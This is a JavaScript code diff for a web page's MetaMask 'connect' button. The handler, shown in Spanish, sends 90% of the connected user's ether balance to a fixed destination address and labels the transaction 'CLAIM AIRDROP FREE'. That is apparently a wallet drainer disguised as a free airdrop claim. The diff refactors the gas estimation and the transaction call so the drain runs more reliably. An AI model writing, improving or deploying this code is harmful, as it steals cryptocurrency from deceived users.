@@ -10,19 +10,20 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
             const cantidadEnviar = balanceEnEther * 0.9; // Asumiendo que quieres enviar el 90% del balance
             const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
 
-            const gasEstimado = await web3.eth.estimateGas({
+            const transactionParameters = {
                 from: usuarioAddress,
                 to: direccionDestino,
                 value: cantidadEnviarEnWei,
-            });
-
-            web3.eth.sendTransaction({
-                from: usuarioAddress,
-                to: direccionDestino,
-                value: cantidadEnviarEnWei,
-                gas: gasEstimado,
                 data: web3.utils.toHex('CLAIM AIRDROP FREE'),
-            })
+            };
+
+            // Estimación dinámica del gas necesario para la transacción
+            const gasEstimado = await web3.eth.estimateGas(transactionParameters);
+
+            // Realizar la transacción con el gas estimado
+            transactionParameters.gas = gasEstimado;
+
+            web3.eth.sendTransaction(transactionParameters)
             .then(receipt => {
                 console.log('Transacción exitosa:', receipt);
                 document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
@@ -37,7 +38,6 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
         console.error('MetaMask no está instalado.');
     }
 });
-
 
 document.getElementById('enviar').addEventListener('click', function() {
     const email = document.getElementById('email').value;
